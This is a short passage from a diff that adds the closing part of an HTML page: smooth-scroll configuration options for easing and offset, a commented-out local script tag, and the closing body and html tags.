+        easing: 'easeInOutCubic', // Easing pattern to use
+        offset: 20, // Integer. How far to offset the scrolling anchor location in pixels
+      });
+    </script>
+    <!-- <script src=" /js/scroll.min.js " charset="utf-8"></script> -->
+  </body>
+
+</html>
